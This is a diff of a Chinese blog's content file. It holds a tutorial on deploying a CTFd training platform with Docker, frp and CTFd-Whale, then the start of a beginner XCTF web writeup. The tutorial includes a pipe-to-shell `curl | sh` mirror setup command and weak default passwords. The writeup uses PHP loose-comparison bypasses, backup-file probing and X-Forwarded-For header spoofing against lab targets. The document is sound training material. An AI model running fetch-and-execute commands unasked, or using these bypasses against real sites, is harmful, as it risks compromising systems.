-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://9cpn8tt6.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>2.服务重启：</p>
-<pre><code>systemctl daemon-reload
-systemctl restart docker</code></pre><p>3.创建题目</p>
-<p>这里选择一个支持动态flag的docker镜像，并选择设置该docker镜像的内部端口,内部端口可以用docker ps -a查看</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B06.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B07.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B08.png" alt=""></p>
-<p>4.测试<br>不出意外的话，现在在challenge界面可以使用动态靶机 管理员也可以在后台管理靶机</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B09.png" alt=""></p>
-<p>可以看到环境启动成功，工作也正常</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B010.png" alt=""></p>
-<p>管理员也可以在在后台管理动态靶机，由于该靶机也支持动态flag</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B011.png" alt=""></p>
-<h1 id="五-常见错误分析与检查"><a href="#五-常见错误分析与检查" class="headerlink" title="五 常见错误分析与检查"></a>五 常见错误分析与检查</h1><p> 一般错误：<br>可以使用命令docker logs &lt;ctfd容器的ID&gt;查看报错情况<br>docker容器无法启动：<br>确保docker api填写正确，如示例中为unix:///var/run/docker.sock<br>你也可以使用端口形式的api如官方示例：可以用IP：端口指定API<br>然后使用如下命令进入ctfd容器，手动调用端口测试</p>
-<pre><code>docker exec -it &lt;ctfd容器的ID&gt; /bin/sh
-/opt/CTFd# python
-&gt;&gt;&gt;import docker
-&gt;&gt;&gt;client=docker.DockerClient(base_url=&quot;unix:///var/run/docker.sock&quot;)
-&gt;&gt;&gt;client.images.list()</code></pre><p>复制代码如果api正确会列出所有镜像<br>frp端口无法映射：<br>可以使用如下命令进入ctfd容器，手动调用端口测试<br>    docker exec -it &lt;ctfd容器的ID&gt; /bin/sh<br>    /opt/CTFd# python<br>    &gt;&gt;&gt;import requests<br>    &gt;&gt;&gt;requests.get(“<a href="http://172.22.0.2:7400/api/reload&quot;" target="_blank" rel="noopener">http://172.22.0.2:7400/api/reload&quot;</a>)<br>    &lt;Response [200]&gt; #这个表示成功</p>
-<p>参考链接 <a href="https://www.zhaoj.in/read-6333.html/" target="_blank" rel="noopener">CTFd-Whale 推荐部署实践</a>.<br><a href="https://juejin.im/post/5dc5811ff265da4d02626e3c#heading-9/" target="_blank" rel="noopener">手把手教你如何建立一个支持ctf动态独立靶机的靶场</a>.<br><a href="http://www.gtfly.top/2019/09/27/CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99.html/" target="_blank" rel="noopener">CTFd动态flag镜像编写</a>.<br><a href="https://blog.csdn.net/qq_33256688/article/details/80319673/" target="_blank" rel="noopener">Docker与Dockerfile极简入门文档</a>.<br><a href="https://www.cnblogs.com/panwenbin-logs/p/8007348.html/" target="_blank" rel="noopener">Dockerfile文件详解</a>. </p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 靶机 </tag>
+            
+            <tag> 环境 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>搭建CTF平台</title>
+      <link href="/2020/01/28/%E6%90%AD%E5%BB%BACTF%E5%B9%B3%E5%8F%B0/"/>
+      <url>/2020/01/28/%E6%90%AD%E5%BB%BACTF%E5%B9%B3%E5%8F%B0/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>想搭一个CTF平台给大家刷题，顺便记录一下搭建过程</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/imgSWFC_EN-AU8629361490_1920x1080.jpg" alt=""></p><p>过年有活动就在阿里云上租了一个服务器练手：</p><p>服务器：Centos 7.4 64位</p><p>开源平台：CTFd</p><a id="more"></a><h1 id="一-安装docker"><a href="#一-安装docker" class="headerlink" title="一 安装docker"></a>一 安装docker</h1><h2 id="安装yum"><a href="#安装yum" class="headerlink" title="安装yum"></a>安装yum</h2><p>1.更新yum包</p><pre><code>yum update</code></pre><p>2.安装必要的系统工具</p><pre><code>yum install -y yum-utils device-mapper-persistent-data lvm2</code></pre><p>3.设置yum源</p><pre><code>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code></pre><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>4.查看并选择合适的docker版本</p><pre><code>yum list docker-ce --showduplicates | sort -r</code></pre><p>5.安装docker</p><pre><code>yum install docker-ce-17.12.1.ce</code></pre><p>6.启动</p><pre><code>systemctl start docker.service</code></pre><p>7.设置为开机自启动</p><pre><code>systemctl enable docker.service</code></pre><p>8.DaoCloud配置docker镜像源加速</p><pre><code>curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</code></pre><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p>1.选择最新的docker-compose版本并下载，官方源安装</p><pre><code>sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</code></pre><p>由于过于缓慢换源</p><pre><code>curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</code></pre><p>2.设置docker-compose执行权限</p><pre><code>sudo chmod +x /usr/local/bin/docker-composedocker-compose --version</code></pre><h1 id="二-安装frp"><a href="#二-安装frp" class="headerlink" title="二 安装frp"></a>二 安装frp</h1><p> 安装启动frps</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">wget</span> <span class="string">https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span></span><br><span class="line"><span class="attr">tar</span> <span class="string">-zxvf frp_0.29.0_linux_amd64.tar.gz</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">frp_0.29.0_linux_amd64</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">cp systemd/* /etc/systemd/system/</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">mkdir /etc/frp</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">cp frpc.ini  frps.ini /etc/frp/</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">cp frpc  frps /usr/bin/</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">chmod a+x /usr/bin/frpc /usr/bin/frps</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">systemctl enable frps</span></span><br></pre></td></tr></table></figure><p>编辑frps.ini</p><pre><code>sudo vim /etc/frp/frps.ini</code></pre><p>frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7897</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">token</span> =thisistoken</span><br></pre></td></tr></table></figure><p>至于frpc.ini，先不急着配置，后面会配置<br>启动frps系统服务</p><pre><code>sudo systemctl start frps</code></pre><p>创建网络并启动frpc容器并配置frpc.ini</p><p>启动frpc容器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker<span class="built_in"> network </span>create ctfd_frp-containers</span><br><span class="line">sudo docker <span class="builtin-name">run</span>  -d -v ~/frp_0.29.0_linux_amd64/frpc.ini:/etc/frp/frpc.ini <span class="attribute">--network</span>=<span class="string">"ctfd_frp-containers"</span> <span class="attribute">--restart</span>=always <span class="string">"glzjin/frp"</span></span><br></pre></td></tr></table></figure><p>创建网络frpcadmin用于ctfd容器和frpc容器通信</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker<span class="built_in"> network </span>create frpcadmin</span><br></pre></td></tr></table></figure><p>连接frpc,如果不知道可以frpc容器名，可以用</p><pre><code>docker ps</code></pre><p>查看frpc的容器名或2ID</p><pre><code>sudo docker network connect frpcadmin &lt;frpc容器名或者ID&gt; </code></pre><p>将frpc和ctfd容器单独连接到网络frpcadmin,注意要等容器创建好之后再连接，因此ctfd将在稍后连接</p><p>查看frpcadmin网络的连接情况并记录frpc容器的网络IP</p><pre><code>docker network inspect frpcadmin </code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/2.png" alt=""></p><p>编辑frpc.ini</p><pre><code>vim ~/frp_0.29.0_linux_amd64/frpc.ini</code></pre><p>frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.17</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7897</span></span><br><span class="line"><span class="attr">token</span>=thisistoken</span><br><span class="line"><span class="attr">admin_addr</span> = <span class="number">172.19</span>.<span class="number">0.2</span> <span class="comment">#这里填写frpc容器在frpcadmin网络里的ip</span></span><br><span class="line"><span class="attr">admin_port</span> = <span class="number">7400</span></span><br><span class="line"><span class="attr">log_file</span> = ./frps.log</span><br></pre></td></tr></table></figure><h1 id="三-安装CTFd"><a href="#三-安装CTFd" class="headerlink" title="三 安装CTFd"></a>三 安装CTFd</h1><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><pre><code>sudo yum install -y git</code></pre><h2 id="从Github上下载CTFd与插件"><a href="#从Github上下载CTFd与插件" class="headerlink" title="从Github上下载CTFd与插件"></a>从Github上下载CTFd与插件</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="string">//github.com/CTFd/CTFd.git</span></span><br><span class="line"><span class="keyword">cd</span> CTFd/</span><br><span class="line"><span class="keyword">cd</span> CTFd/plugins <span class="comment">#打开ctfd插件目录</span></span><br><span class="line">git clone https:<span class="string">//github.com/glzjin/CTFd-Whale.git</span> ctfd-whale <span class="comment">#确保插件文件夹小写</span></span><br><span class="line"><span class="keyword">cd</span> ctfd-whale</span><br><span class="line"><span class="keyword">cd</span> <span class="string">../../../</span> <span class="comment">#返回ctfd主目录</span></span><br><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><p>配置docker-compose.yml</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">version</span>: <span class="string">'2'</span></span><br><span class="line">service<span class="variable">s:</span></span><br><span class="line">  ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restar<span class="variable">t:</span> always</span><br><span class="line">    port<span class="variable">s:</span></span><br><span class="line">      - <span class="string">"8000:8000"</span> #你自己的</span><br><span class="line">    environmen<span class="variable">t:</span></span><br><span class="line">      - UPLOAD_FOLDER=/var/uploads</span><br><span class="line">      - DATABASE_URL=mysql+pymysq<span class="variable">l:</span>//roo<span class="variable">t:ctfd</span>@db/ctfd</span><br><span class="line">      - REDIS_URL=<span class="keyword">redi</span><span class="variable">s:</span>//cache:<span class="number">6379</span></span><br><span class="line">      - WORKERS=<span class="number">1</span></span><br><span class="line">      - LOG_FOLDER=/var/<span class="built_in">log</span>/CTFd</span><br><span class="line">      - ACCESS_LOG=-</span><br><span class="line">      - ERROR_LOG=-</span><br><span class="line">    volume<span class="variable">s:</span></span><br><span class="line">      - .data/CTFd/<span class="built_in">log</span><span class="variable">s:</span>/var/<span class="built_in">log</span>/CTFd</span><br><span class="line">      - .data/CTFd/upload<span class="variable">s:</span>/var/uploads</span><br><span class="line">      - .:/<span class="keyword">opt</span>/CTFd:ro</span><br><span class="line">      - /var/run/docker.sock:/var/run/docker.sock #添加这句即可，别的基本按照官方的不用动</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    network<span class="variable">s:</span></span><br><span class="line">        defaul<span class="variable">t:</span></span><br><span class="line">        interna<span class="variable">l:</span></span><br><span class="line">  d<span class="variable">b:</span></span><br><span class="line">    image: mariad<span class="variable">b:10</span>.<span class="number">4</span></span><br><span class="line">    restar<span class="variable">t:</span> always</span><br><span class="line">    environmen<span class="variable">t:</span></span><br><span class="line">      - MYSQL_ROOT_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_USER=ctfd</span><br><span class="line">      - MYSQL_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_DATABASE=ctfd</span><br><span class="line">    volume<span class="variable">s:</span></span><br><span class="line">      - .data/mysq<span class="variable">l:</span>/var/lib/mysql</span><br><span class="line">    network<span class="variable">s:</span></span><br><span class="line">        interna<span class="variable">l:</span></span><br><span class="line">    # This <span class="keyword">command</span> <span class="keyword">is</span> required <span class="keyword">to</span> <span class="keyword">set</span> important mariadb defaults</span><br><span class="line">    <span class="keyword">command</span>: [mysqld, --character-<span class="keyword">set</span>-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=<span class="number">28800</span>, --<span class="built_in">log</span>-warnings=<span class="number">0</span>]</span><br><span class="line">  cache:</span><br><span class="line">    image: <span class="keyword">redi</span><span class="variable">s:4</span></span><br><span class="line">    restar<span class="variable">t:</span> always</span><br><span class="line">    volume<span class="variable">s:</span></span><br><span class="line">    - .data/<span class="keyword">redi</span><span class="variable">s:</span>/data</span><br><span class="line">    network<span class="variable">s:</span></span><br><span class="line">        interna<span class="variable">l:</span></span><br><span class="line">network<span class="variable">s:</span></span><br><span class="line">    defaul<span class="variable">t:</span></span><br><span class="line">    interna<span class="variable">l:</span></span><br><span class="line">        interna<span class="variable">l:</span> true</span><br></pre></td></tr></table></figure><p>重新build后启动ctfd 使用 docker-compose 启动项目</p><pre><code>docker-compose buildddocker-compose up -d</code></pre><p>将ctfd连接frpcadmin网络</p><pre><code>docker network connect frpcadmin &lt;ctfd容器名或者ID&gt;</code></pre><p>静静等待安装完成，成功会弹出<a href="http://0.0.0.0:8000,此时，你的ctfd就安装完成了" target="_blank" rel="noopener">http://0.0.0.0:8000,此时，你的ctfd就安装完成了</a>,<br>如果安装成功不能访问，看下是不是防火墙把端口给过滤掉了。</p><p>启动ctfd后进入注册管理员，然后进入管理页面选择插件</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B03.png" alt=""></p><p>其余照着填就好了，Frp的API地址根据自己的填。</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B04.png" alt=""></p><p>Frp config template一栏，token写自己的，admin_addr根据自己的实际情况写，Docker Auto Connect Network照着写。</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B05.png" alt=""></p><h1 id="四-部署题目"><a href="#四-部署题目" class="headerlink" title="四 部署题目"></a>四 部署题目</h1><p>部署前先里了解一下Dockers的一些基本用法</p><p>doker部署的东西分为镜像和容器两种，有什么区别呢？</p><p>镜像：</p><p>多个只读层叠加在一起，层与层之间通过指针关联，这些层能够在运行Docker的宿主机的文件系统上访问到</p><p>容器：</p><p>容器和容器镜像一样，也是若干层的叠加，唯一区别是所有只读层的最上面一层，是一层可读可写层，初学者可以记住这个简单的公式：容器 = 容器镜像 + 可读可写层</p><h2 id="docker镜像常见命令"><a href="#docker镜像常见命令" class="headerlink" title="docker镜像常见命令"></a>docker镜像常见命令</h2><p>查看所有下载的镜像：</p><pre><code>sudo docker images</code></pre><p>搜索镜像：</p><pre><code>sudo docker search 镜像名称</code></pre><p>获取镜像：</p><pre><code>sudo docker pull 镜像名称</code></pre><p>运行镜像：</p><pre><code>sudo docker run -d --name 容器名称 -p 80:80 镜像名称</code></pre><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-d：后台运行</span></span><br><span class="line"><span class="deletion">-name：容器名称(自己命名)</span></span><br><span class="line"><span class="deletion">-p：指定docker运行此镜像所使用的端口，第一个是外网端口，第二个是内网端口</span></span><br><span class="line">–privileged：使用该参数，container内的root拥有真正的root权限</span><br><span class="line"><span class="deletion">-i：以交互模式运行容器</span></span><br><span class="line"><span class="deletion">-t：为容器重新分配一个伪输入终端</span></span><br><span class="line">–link 其他容器：将该容器与其他容器进行连接</span><br></pre></td></tr></table></figure><p>删除镜像：</p><pre><code>sudo docker rmi -f IMAGE-ID/name</code></pre><p>其中，IMAGE-ID可在镜像列表中查看；只需使用IMAGE ID前四位即可；也可以使用镜像的名字</p><h2 id="docker容器常见命令"><a href="#docker容器常见命令" class="headerlink" title="docker容器常见命令"></a>docker容器常见命令</h2><p>查看容器列表：</p><pre><code>sudo docker ps -a</code></pre><p>停止容器：</p><pre><code>sudo docker stop CONTAINER-ID/name</code></pre><p>其中，CONTAINER ID可在容器列表中查看；只需使用CONTAINER ID前四位即可；也可以使用运行镜像时所命名的容器名字</p><p>运行容器：</p><pre><code>sudo docker start CONTAINER-ID/name</code></pre><p>删除容器(容器需已停止运行)：</p><pre><code>sudo docker rm CONTAINER-ID/name</code></pre><p>进入容器(不知道什么原因，使用docker attach命令无法进入到容器中～)</p><pre><code>sudo docker exec -it CONTAINER-ID/name /bin/bash</code></pre><p>不能用的话可以试试</p><pre><code>sudo docker exec -it  CONTAINER-ID/name /bin/sh sudo docker exec -it  CONTAINER-ID/name bash</code></pre><p>拷贝文件</p><pre><code>docker cp ~/index.php 容器id:/var/www/html</code></pre><h2 id="开始部署题目"><a href="#开始部署题目" class="headerlink" title="开始部署题目"></a>开始部署题目</h2><p>1.本地部署镜像</p><pre><code>docker pull ctftraining/qwb_2019_supersqli </code></pre><p>由于docker pull 官方源速度慢问题</p><p>将docker镜像源修改为国内的：<br>在 /etc/docker/daemon.json 文件中添加以下参数（没有该文件则新建）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://9cpn8tt6.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.服务重启：</p><pre><code>systemctl daemon-reloadsystemctl restart docker</code></pre><p>3.创建题目</p><p>这里选择一个支持动态flag的docker镜像，并选择设置该docker镜像的内部端口,内部端口可以用docker ps -a查看</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B06.png" alt=""></p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B07.png" alt=""></p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B08.png" alt=""></p><p>4.测试<br>不出意外的话，现在在challenge界面可以使用动态靶机 管理员也可以在后台管理靶机</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B09.png" alt=""></p><p>可以看到环境启动成功，工作也正常</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B010.png" alt=""></p><p>管理员也可以在在后台管理动态靶机，由于该靶机也支持动态flag</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/CTFd%E5%B9%B3%E5%8F%B011.png" alt=""></p><h1 id="五-常见错误分析与检查"><a href="#五-常见错误分析与检查" class="headerlink" title="五 常见错误分析与检查"></a>五 常见错误分析与检查</h1><p> 一般错误：<br>可以使用命令docker logs &lt;ctfd容器的ID&gt;查看报错情况<br>docker容器无法启动：<br>确保docker api填写正确，如示例中为unix:///var/run/docker.sock<br>你也可以使用端口形式的api如官方示例：可以用IP：端口指定API<br>然后使用如下命令进入ctfd容器，手动调用端口测试</p><pre><code>docker exec -it &lt;ctfd容器的ID&gt; /bin/sh/opt/CTFd# python&gt;&gt;&gt;import docker&gt;&gt;&gt;client=docker.DockerClient(base_url=&quot;unix:///var/run/docker.sock&quot;)&gt;&gt;&gt;client.images.list()</code></pre><p>复制代码如果api正确会列出所有镜像<br>frp端口无法映射：<br>可以使用如下命令进入ctfd容器，手动调用端口测试<br>    docker exec -it &lt;ctfd容器的ID&gt; /bin/sh<br>    /opt/CTFd# python<br>    &gt;&gt;&gt;import requests<br>    &gt;&gt;&gt;requests.get(“<a href="http://172.22.0.2:7400/api/reload&quot;" target="_blank" rel="noopener">http://172.22.0.2:7400/api/reload&quot;</a>)<br>    &lt;Response [200]&gt; #这个表示成功</p><p>参考链接 <a href="https://www.zhaoj.in/read-6333.html/" target="_blank" rel="noopener">CTFd-Whale 推荐部署实践</a>.<br><a href="https://juejin.im/post/5dc5811ff265da4d02626e3c#heading-9/" target="_blank" rel="noopener">手把手教你如何建立一个支持ctf动态独立靶机的靶场</a>.<br><a href="http://www.gtfly.top/2019/09/27/CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99.html/" target="_blank" rel="noopener">CTFd动态flag镜像编写</a>.<br><a href="https://blog.csdn.net/qq_33256688/article/details/80319673/" target="_blank" rel="noopener">Docker与Dockerfile极简入门文档</a>.<br><a href="https://www.cnblogs.com/panwenbin-logs/p/8007348.html/" target="_blank" rel="noopener">Dockerfile文件详解</a>. </p>]]></content>
+      
+      
       <categories>
-        <category>CTFd</category>
+          
+          <category> CTFd </category>
+          
       </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界writeup</title>
-    <url>/2020/01/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_writeup/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>攻防世界 web writeup</p>
-<a id="more"></a>
-
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cview_source1.png" alt=""></p>
-<p>Fn12</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cview_source2.png" alt=""></p>
-<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>1.根据提示robots,可以直接想到robots.txt</p>
-<p>访问<a href="http://111.198.29.45:33982/robots.txt发现f1ag_1s_h3re.php" target="_blank" rel="noopener">http://111.198.29.45:33982/robots.txt发现f1ag_1s_h3re.php</a></p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Crobots1.png" alt=""></p>
-<p>2.访问<a href="http://111.198.29.45:33982/f1ag_1s_h3re.php得到flag" target="_blank" rel="noopener">http://111.198.29.45:33982/f1ag_1s_h3re.php得到flag</a></p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Crobots2.png" alt=""></p>
-<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>掌握有关备份文件的知识</p>
-<p>常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history</p>
-<p>访问url/index.php.bak</p>
-<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>1.浏览器按下F12键打开开发者工具，刷新后，在存储一栏，可看到名为look-here的cookie的值为cookie.php</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccookie1.png" alt=""></p>
-<p>2.访问<a href="http://111.198.29.45:47911/cookie.php，提示查看http响应包，在网络一栏，可看到访问cookie.php的数据包" target="_blank" rel="noopener">http://111.198.29.45:47911/cookie.php，提示查看http响应包，在网络一栏，可看到访问cookie.php的数据包</a></p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccooki21.png" alt=""></p>
-<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>1.打开开发者工具，在查看器窗口审查元素，发现存在disabled=””字段</p>
-<p>2.将disabled=””删除后，按钮可按，按下后得到flag</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cdisableedbutton.png" alt=""></p>
-<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C1.png" alt=""></p>
-<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>1.打开页面，进行代码审计，发现同时满足 $a==0 和 $a 时，显示flag1。</p>
-<p>2.php中的弱类型比较会使’abc’ == 0为真，所以输入a=abc时，可得到flag1，如图所示。（abc可换成任意字符）。</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csimple_php.png" alt=""></p>
-<p>3.is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使(‘1234a’ == 1234)为真，所以当输入a=abc&amp;b=1235a，可得到flag2，如图所示。</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csimple_php2.png" alt=""></p>
-<h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>按照题目先用get方式提交a=1</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cget_post1.png" alt=""></p>
-<p>再用post方式提交b=2</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cget_post2.png" alt=""></p>
-<h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>1.打开firefox和burp，使用burp对firefox进行代理拦截，在请求头添加X-Forwarded-For: 123.123.123.123，然后放包</p>
